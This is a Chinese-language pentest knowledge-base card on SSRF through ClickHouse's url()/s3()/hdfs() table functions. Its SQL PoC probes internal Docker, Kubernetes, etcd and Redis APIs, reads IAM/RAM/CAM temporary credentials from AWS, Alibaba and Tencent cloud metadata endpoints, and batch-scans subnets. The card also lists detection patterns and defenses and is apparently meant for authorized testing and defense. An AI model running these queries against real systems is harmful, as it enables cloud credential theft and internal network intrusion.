---
id: web-generic-ssrf-clickhouse-url-s3-hdfs-cloud-metadata
title: ClickHouse url()/s3()/hdfs() 表函数 SSRF：探测内网服务与读取云元数据
type: scenario
domain: web
path: web/generic/ssrf
technique: clickhouse-table-function-ssrf
tags:
- clickhouse
- ssrf
- database
- cloud-metadata
- url-function
- internal-network
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V75
  verified_at: '2026-11-05T16:30:10+08:00'
  notes: 已对照原文核对；url()/s3()/hdfs() SSRF、云元数据地址与原文一致；已保留 GCP 需 Metadata-Flavor 头、AWS IMDSv2 会失败的边界说明；PoC未执行
url: /docs/web/generic/ssrf/web-generic-ssrf-clickhouse-url-s3-hdfs-cloud-metadata/
draft: false
kb_aliases:
- ClickHouse SSRF
- url() 表函数
- s3() SSRF
- hdfs() SSRF
- ClickHouse 云元数据
---

## 一句话结论

具备 ClickHouse SQL 执行权且用户有 `url`/`s3`/`hdfs` 等表函数权限时，这些函数会让数据库服务器主动发起网络请求；攻击者可借此探测内网服务、访问 Docker/Kubernetes/etcd 等未授权 API，或读取 AWS/阿里云/腾讯云/GCP 元数据获取临时凭据，形成以数据库为跳板的 SSRF。

## 原理

- ClickHouse 的 `url()` 表函数在服务端发起 HTTP 请求并把响应体按指定格式解析成表；`s3()`、`hdfs()` 分别访问对象存储与 HDFS/WebHDFS 端点。请求源地址是 ClickHouse 主机，因此能访问仅内网可达、外部攻击者无法直达的服务。
- 云厂商元数据服务通常只允许本机访问（AWS `169.254.169.254`、阿里云 `100.100.100.200`、腾讯云 `metadata.tencentyun.com`、GCP `metadata.google.internal`）；ClickHouse 部署在云主机上时，`url()` 即可读取实例信息、User Data 与 IAM/RAM/CAM 临时凭证。
- 响应内容通过查询结果回显；`SETTINGS connect_timeout=2, receive_timeout=2` 可控制探测时长，`UNION ALL` 可批量扫描网段/端口。
- 该手法依赖表函数可用（SOURCES 权限或未禁用）以及目标网络可达；AWS IMDSv2、GCP 的 `Metadata-Flavor: Google` 头等防护会使简单 GET 失败，需要能自定义请求头或换用其他协议。

## 触发条件

- 拥有 ClickHouse SQL 执行权限，且 `url`/`s3`/`hdfs` 表函数可用（未被权限或配置禁用）；
- ClickHouse 主机可访问内网或公网，或目标云环境的元数据服务可达；
- 云元数据未强制 IMDSv2/自定义 Header 等限制（AWS IMDSv2 需先取 token；GCP 需 `Metadata-Flavor: Google`）；
- 目标内网服务对 ClickHouse 主机开放，且响应能通过查询结果回显。

## 利用步骤

1. 确认表函数可用：`SELECT name FROM system.table_functions WHERE name IN ('url','s3','hdfs');`，并检查当前用户权限。
2. 用 `url()` 探测本机与内网常见服务：Redis 6379、Elasticsearch 9200、Docker API 2375、Kubernetes 10250、etcd 2379 等；`SETTINGS connect_timeout=2` 控制超时。
3. 读取云元数据：AWS IAM 临时凭证路径、阿里云 RAM 凭证、腾讯云 CAM 凭证与 User Data、GCP 元数据根路径。
4. 批量扫描：用 `UNION ALL` 拼接多个 IP/端口，或在外部脚本生成 SQL（原文给了 Python 生成器）；只对授权范围内目标使用。
5. 拿到临时凭据后在云 CLI/SDK 中验证权限；拿到内网服务响应后继续找未授权 API。
6. 记录请求时间、目标地址与响应，作为 SSRF 证据；清理无副作用。

## PoC

```sql
-- 基本请求与超时
SELECT * FROM url('http://target:port/path', 'RawBLOB', 'data String');
SELECT * FROM url('http://127.0.0.1:2375/version', 'RawBLOB', 'd String')
SETTINGS connect_timeout=2, receive_timeout=2;

-- 内网服务探测
SELECT * FROM url('http://127.0.0.1:6379/', 'RawBLOB', 'd String');
SELECT * FROM url('http://127.0.0.1:9200/', 'RawBLOB', 'd String');
SELECT * FROM url('http://127.0.0.1:2375/containers/json', 'RawBLOB', 'd String');
SELECT * FROM url('http://127.0.0.1:10250/pods', 'RawBLOB', 'd String');
SELECT * FROM url('http://127.0.0.1:2379/version', 'RawBLOB', 'd String');

-- 云元数据
SELECT * FROM url('http://169.254.169.254/latest/meta-data/', 'RawBLOB', 'd String');
SELECT * FROM url('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'RawBLOB', 'd String');
SELECT * FROM url('http://100.100.100.200/latest/meta-data/', 'RawBLOB', 'd String');
SELECT * FROM url('http://100.100.100.200/latest/meta-data/ram/security-credentials/', 'RawBLOB', 'd String');
SELECT * FROM url('http://metadata.tencentyun.com/latest/meta-data/', 'RawBLOB', 'd String');
SELECT * FROM url('http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/', 'RawBLOB', 'd String');

-- 批量扫描（示例）
SELECT '192.168.1.1' AS ip, * FROM url('http://192.168.1.1:80/', 'RawBLOB', 'd String') SETTINGS connect_timeout=2
UNION ALL
SELECT '192.168.1.2', * FROM url('http://192.168.1.2:80/', 'RawBLOB', 'd String') SETTINGS connect_timeout=2;
```

## 变体与关联

- 变体：`s3('http://target:port/bucket/file', ...)`、`hdfs('hdfs://target:9000/path', ...)`、`hdfs('webhdfs://target:50070/path', ...)` 可访问对象存储/HDFS 端点，不限于 HTTP 表函数。
- 变体：GCP 元数据需要 `Metadata-Flavor: Google` 头，文章示例直接 GET 可能失败，需换用能设置头的请求方式或确认目标响应。
- 关联：SSRF 通用卡片 [[web-generic-ssrf-redis-inline-protocol-crlf]]、云元数据 [[cloud-metadata]]；ClickHouse 信息收集 [[pentest-recon-clickhouse-system-table-credential]]；横向移动 [[pentest-lateral-movement-clickhouse-table-function-database-pivot]]。

## 检测与防御

- 检测：ClickHouse 查询中出现 `url(`、`s3(`、`hdfs(`、`169.254.169.254`、`100.100.100.200`、`metadata.tencentyun.com`、`metadata.google.internal`；数据库主机对内部端口/元数据地址的异常出站连接；查询结果返回云元数据/实例信息。
- 防御：按用户限制 `url`/`s3`/`hdfs` 表函数与 SOURCES 权限；对数据库主机做网络出口 ACL，禁止访问元数据地址与无关内网段；启用云厂商 IMDSv2/HopLimit、GCP 元数据头校验、腾讯云元数据访问控制；监控危险表函数调用并告警。
- 注意：仅在授权范围内扫描；批量 UNION 扫描可能对数据库和网络造成压力，应控制并发与超时。
